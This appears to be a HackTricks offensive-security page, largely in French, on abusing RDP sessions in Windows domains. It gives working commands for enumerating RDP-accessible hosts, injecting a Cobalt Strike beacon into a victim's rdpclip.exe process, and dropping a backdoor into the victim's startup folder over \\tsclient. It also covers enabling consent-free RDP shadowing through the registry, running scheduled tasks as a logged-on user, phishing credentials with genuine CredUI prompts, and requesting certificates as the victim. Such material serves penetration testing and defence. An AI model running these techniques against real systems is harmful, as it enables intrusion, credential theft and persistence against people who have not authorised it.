# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Si le **groupe externe** a un **accès RDP** à un **ordinateur** du domaine actuel, un attaquant qui compromet cet ordinateur peut attendre qu’un membre du groupe s’y connecte.

Une fois que l’utilisateur se connecte via RDP, **l’attaquant peut pivoter vers la session de cet utilisateur** et abuser de ses permissions dans le domaine externe.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Vérifiez **d’autres façons de voler des sessions avec d’autres outils** [**sur cette page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Relais d’authentification entre sessions

Une **session de console ou RDP active** appartenant à un autre utilisateur du domaine peut aussi être une piste lorsque vous avez un shell avec moins de privilèges sur le même hôte. L’activation DCOM entre sessions peut amener un serveur COM approprié dans cette session interactive à s’authentifier, et des outils tels que RemotePotato0 ou KrbRelay peuvent capturer ou relayer cette authentification. L’utilisateur connecté n’a pas besoin d’être administrateur du domaine : un droit limité dans l’annuaire, tel que l’autorisation de lire un mot de passe géré gMSA, peut suffire pour un pivot supplémentaire.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Commencez par relever l’ID de session et l’identité avec `query user`, `qwinsta` ou l’inventaire des sessions existantes de winPEAS. Considérez-les comme des **candidats**, et non comme une preuve qu’une voie de relay est possible. La classe COM, ses niveaux d’usurpation d’identité et d’authentification, l’accessibilité de la session, le routage du pare-feu/OXID, les protections du protocole cible et les droits effectifs du principal connecté sont autant de facteurs importants. KrbRelay documente des exemples de cross-session pour LDAP, HTTP, SMB et NTLM, mais ces voies dépendent de la version et de la configuration. Le channel binding LDAP constitue également une autre barrière au relay côté cible. En particulier, le projet RemotePotato0 indique que son scénario d’exploitation original RPC-vers-LDAP a été corrigé en 2022 ; ne déduisez pas qu’un relay LDAP est possible simplement parce qu’une session est visible.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Si un utilisateur accède à une machine **via RDP** alors qu’un **attaquant** l’**attend**, l’attaquant pourra **injecter un beacon dans la session RDP de l’utilisateur**. Si la **victime a monté son lecteur** lors de la connexion via RDP, l’**attaquant pourra y accéder**.

Dans ce cas, vous pouvez simplement **compromettre** l’**ordinateur d’origine** de la **victime** en écrivant une **backdoor** dans le **dossier de démarrage**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Si vous êtes **local admin** sur un hôte où la victime a déjà une **session RDP active**, vous pouvez peut-être **voir/contrôler ce bureau sans voler le mot de passe ni dumper LSASS**.<sup>[[1]](#references)</sup>

Cela dépend de la stratégie **Remote Desktop Services shadowing** stockée dans :<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Valeurs intéressantes :

- `0` : Désactivé
- `1` : `EnableInputNotify` (contrôle, approbation de l’utilisateur requise)
- `2` : `EnableInputNoNotify` (contrôle, **sans approbation de l’utilisateur**)
- `3` : `EnableNoInputNotify` (lecture seule, approbation de l’utilisateur requise)
- `4` : `EnableNoInputNoNotify` (lecture seule, **sans approbation de l’utilisateur**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

C'est particulièrement utile lorsqu'un utilisateur privilégié connecté via RDP a laissé un bureau déverrouillé, une session KeePass, une console MMC, une session de navigateur ou un shell admin ouvert.

## Scheduled Tasks As Logged-On User

Si vous êtes **admin local** et que l'utilisateur cible est **actuellement connecté**, le Planificateur de tâches peut lancer du code **en tant que cet utilisateur sans son mot de passe**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Cela transforme la session de connexion existante de la victime en primitive d'exécution :

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Notes :

- Si l’utilisateur **n’est pas connecté**, Windows exige généralement le mot de passe pour créer une tâche qui s’exécute sous son compte.
- Si l’utilisateur **est connecté**, la tâche peut réutiliser le contexte de connexion existant.
- C’est une méthode pratique pour exécuter des actions GUI ou lancer des binaires dans la session de la victime sans toucher à LSASS.

## Abus des invites CredUI depuis la session de la victime

Dès que vous pouvez exécuter du code **dans le bureau interactif de la victime** (par exemple via **Shadow RDP** ou **une tâche planifiée exécutée sous le compte de cet utilisateur**), vous pouvez afficher une **véritable invite d’identification Windows** à l’aide des API CredUI et récupérer les identifiants saisis par la victime.<sup>[[1]](#references)</sup>

API concernées :

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Déroulement typique :

1. Lancer un binaire dans la session de la victime.
2. Afficher une invite d’authentification de domaine correspondant à l’identité visuelle du domaine actuel.
3. Décompresser le tampon d’authentification renvoyé.
4. Valider les identifiants fournis et, si nécessaire, continuer à afficher l’invite jusqu’à ce que des identifiants valides soient saisis.

Cette technique est utile pour le **phishing sur l’hôte**, car l’invite est affichée par les API standard de Windows plutôt que par un faux formulaire HTML.

## Demander un PFX dans le contexte de la victime

La même primitive de **tâche planifiée exécutée sous le compte de l’utilisateur** peut servir à demander un **certificat/PFX en tant que victime connectée**. Ce certificat pourra ensuite être utilisé pour l’**authentification AD** sous le compte de cet utilisateur, sans avoir à voler son mot de passe.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Déroulement général :

1. Obtenir les privilèges **local admin** sur un hôte où la victime est connectée.
2. Exécuter la logique d’inscription/exportation en tant que victime à l’aide d’une **tâche planifiée**.
3. Exporter le **PFX** obtenu.
4. Utiliser le PFX pour l’authentification AD par PKINIT / certificat.

Consultez les pages AD CS pour découvrir d’autres techniques d’abus :

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Des réseaux plats aux domaines verrouillés grâce aux modèles de segmentation par niveaux](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – options de session miroir de `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR #465 du plugin Shadow RDP](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - module schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR #908 pour demander un PFX via une tâche planifiée](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - activation DCOM intersession et limites actuelles](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - exemples de relais intersession et exigences relatives aux CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - commande query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - attribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - liaison de canal LDAP et protection contre le relais](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
